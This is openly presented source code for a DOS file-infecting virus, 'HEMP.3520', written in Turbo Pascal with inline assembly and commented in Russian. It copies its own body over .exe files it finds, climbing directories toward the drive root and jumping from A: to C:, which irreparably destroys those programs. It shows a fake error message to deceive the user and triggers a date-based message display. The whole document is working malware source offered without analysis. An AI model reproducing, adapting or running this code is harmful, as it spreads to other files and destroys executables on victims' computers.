{$S-,I-}              {Команда компилятору на уменьшение кода вируса}
uses dos;             {Используем команды DOSa}
const l = 3520;       {Длина тела вируса}
x = '*.exe';
var we : file;
b : array[1..l] of byte;
procedure VD;         {Процедура проверки даты и вывода на экран копирайтов}
var y,m,d,dw : word;
begin
getdate(y,m,d,dw);    {Берем текущую дату}
if m = d+1 then begin {Если месяц = день + 1}
asm
   @sm:  db   'HEMP.3520 BY DeFekt$'        {Выводим копирайты}
   push ds
   push cs
   pop  ds
   mov  dx,offset @sm
   mov  ah,9
   int  21h
   pop  ds
end;
halt;                                       {Выходим}
end
else exit;            {А если месяц != день +1, то ничего не делаем :}
end;
procedure IFile(path : string); {Процедура заражения файлов}
var they : file;
begin
assign(they,path);
reset(they,1);        {Открываем файл}
blockwrite(they,b,l); {Записываем туда свой код}
close(they);
end;
procedure findf;      {Процедура поиска файлов}
var SR : searchrec;
h, m, s, sot : word;
begin
gettime(h,m,s,sot);   {Берем текущее время}
s := m div h;         {Делим минуты на часы - получаем нужное кол-во файлов}
if s = 0 then exit;   {Если результат деления 0, выходим}
h :=0;
findfirst(x,anyfile,SR); {Ищем файл}
for h := 1 to s+1 do begin
IFile(SR.name);       {Заражаем}
findnext(SR);
end;
end;
procedure sInfFile;   {Проверка на корен диска}
var i : byte; dir : string;
begin
getdir(0,dir);        {Берем текущую дерикторию}
if dir = chr(65)+':\' then chdir(chr(67)+':\'); findf;  {Если в А:\ то ищем файлы для заражения в C:\}
for i := 66 to 90 do begin
if dir = chr(i)+':\' then exit {Если она равна A..Z+:\, то выходим}
else chdir('..'); findf; {Если не в корне, то переходим на уровень вверх}
end;
end;
begin
assign(we,paramstr(0));
reset(we,1);
blockread(we,b,l);       {Считали тело вируса в массив}
close(we);
sInfFile;                {Проверка на корень диска}
findf;                   {На поиск файлов}
VD;                      {Проверка даты и демонстрация копирайтов}
asm
   @ms:  db   'ERROR IN 0x532x0$'    {Выводим ложную ошибку на экран}
   push ds
   push cs
   pop  ds
   mov  dx,offset @ms
   mov  ah,9
   int  21h
   pop  ds
end;
asm
   jmp @e
   db 'HEMP.3520 by DeFekt$'   {Копирайты - как же без них...:}
   @e:
end;
end.                           {Вот и все!}